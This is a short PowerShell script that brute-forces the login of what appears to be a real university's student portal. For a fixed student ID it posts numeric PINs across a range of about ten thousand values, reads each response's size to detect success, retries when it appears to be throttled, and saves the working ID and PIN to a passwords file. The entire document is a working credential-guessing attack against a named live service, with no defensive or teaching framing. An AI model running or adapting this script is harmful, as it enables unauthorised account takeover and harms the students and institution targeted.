$url = "https://uos.sharjah.ac.ae:9050/prod_enUS/twbkwbis.P_ValLogin"
$ID = "U00000000"
(mkdir attempts) > $NULL
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
(curl $url -websession $session) > $NULL
for ($i = 32169580; $i -le 32179600; $i++)
{
curl -uri $url -websession $session -method post -body @{sid=$ID;PIN=$i} -outFile "attempts\$i.html"
$size = (Get-Item "attempts\$i.html").length
echo $i
del "attempts\$i.html"
if ($size -gt 400)
{
	if ($size -lt 2000)
	{
		$i-=1
		#$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
		#(curl $url -websession $session) > $NULL
		#sleep 2
	}
}
else
{
	echo "ID: $ID" "Password:$i" >> passwords.txt
	break
}
#sleep 2
}
echo done!